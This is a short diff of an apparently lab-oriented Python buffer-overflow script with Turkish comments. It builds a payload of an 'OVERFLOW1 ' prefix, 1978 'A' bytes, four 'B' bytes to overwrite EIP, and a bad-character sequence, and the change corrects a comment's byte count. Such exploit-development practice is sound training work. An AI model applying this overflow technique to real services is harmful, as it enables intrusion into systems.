@@ -41,7 +41,7 @@ badchars = (
 prefix = "OVERFLOW1 "  # Hedef uygulamaya gönderilecek komutun ön eki. Bu uygulamaya bağlı olarak değiştirilmelidir.
 string = prefix + "A"*1978 + "B"*4 + badchars  # Gönderilecek toplam veri.
 # - prefix: "OVERFLOW1 " ile başlıyor.
-# - "A"*1274: 1978 bayt 'A' karakteri gönderiliyor. Bu buffer overflow'un test edilmesi için kullanılır.
+# - "A"*1978: 1978 bayt 'A' karakteri gönderiliyor. Bu buffer overflow'un test edilmesi için kullanılır.
 # - "B"*4: EIP üzerine yazılacak 4 baytlık 'B' karakterleri.
 # - badchars: Ardından yukarıda tanımlanan tüm kötü karakterler (badchars) gönderiliyor. Bu, kötü karakterlerin hedef uygulamada sorun çıkarıp çıkarmadığını kontrol etmek için.
 
